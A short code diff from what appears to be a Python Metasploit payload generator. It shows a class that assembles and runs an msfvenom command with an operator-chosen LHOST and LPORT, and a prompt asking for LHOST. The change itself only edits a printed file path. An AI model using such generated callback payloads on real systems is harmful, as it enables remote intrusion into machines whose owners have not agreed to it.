@@ -24,7 +24,7 @@ class payload:
 			command = f"msfvenom --payload {self.path} LHOST={self.lhost} LPORT={str(self.lport)} -a {self.arch} -o payloads/{self.name}"
 		os.system(command)
 		rpath = generateresource(self)
-		print(f"{Style.BRIGHT}[{Fore.YELLOW}PAYLOAD{Fore.RESET}]{Style.RESET_ALL} Success!\nPayload: {Fore.GREEN}lemon/payloads/{self.name}{Fore.RESET}\nMSF Resource File: {Fore.GREEN}{rpath}{Fore.RESET}")
+		print(f"{Style.BRIGHT}[{Fore.YELLOW}PAYLOAD{Fore.RESET}]{Style.RESET_ALL} Success!\nPayload: {Fore.GREEN}payloads/{self.name}{Fore.RESET}\nMSF Resource File: {Fore.GREEN}{rpath}{Fore.RESET}")
 def payloadoptions(path):
 	print('')
 	ip = input(f'{Style.BRIGHT}[{Fore.YELLOW}LHOST{Fore.RESET}]{Style.RESET_ALL} >> ')
